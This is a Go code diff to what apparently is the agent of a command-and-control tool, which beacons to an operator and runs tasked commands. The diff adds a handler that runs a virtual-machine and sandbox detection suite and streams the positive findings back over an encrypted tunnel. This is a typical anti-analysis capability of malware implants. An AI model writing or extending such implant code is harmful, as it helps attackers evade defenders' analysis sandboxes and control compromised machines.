@@ -321,6 +321,12 @@ func runSession(host string, port int, agentID, caFP string, beaconSec int) erro
 				continue
 			}
 			go runHostInfo(conn, sess, h)
+		case proto.TypeVMDetectStart:
+			var v proto.VMDetectStart
+			if err := json.Unmarshal(env.Payload, &v); err != nil {
+				continue
+			}
+			go runVMDetect(conn, sess, v)
 		case proto.TypeWirelessStop:
 			var ws proto.WirelessStop
 			if err := json.Unmarshal(env.Payload, &ws); err != nil {
@@ -1956,6 +1962,23 @@ func runHostInfo(conn net.Conn, sess *crypto.Session, h proto.HostInfoStart) {
 	sendTunnelAck(conn, sess, proto.TypeHostInfoData, proto.HostInfoData{
 		SessionID: h.SessionID,
 		JSON:      string(blob),
+		Done:      true,
+	})
+}
+
+// runVMDetect runs the VM/sandbox detection suite and streams the positives.
+func runVMDetect(conn net.Conn, sess *crypto.Session, v proto.VMDetectStart) {
+	results := recon2.VMDetect()
+	var signals []string
+	for _, r := range results {
+		if r.Positive {
+			signals = append(signals, r.Check+"|"+r.Signal+"|"+r.Evidence)
+		}
+	}
+	sendTunnelAck(conn, sess, proto.TypeVMDetectData, proto.VMDetectData{
+		SessionID: v.SessionID,
+		Signals:   signals,
+		Count:     len(signals),
 		Done:      true,
 	})
 }
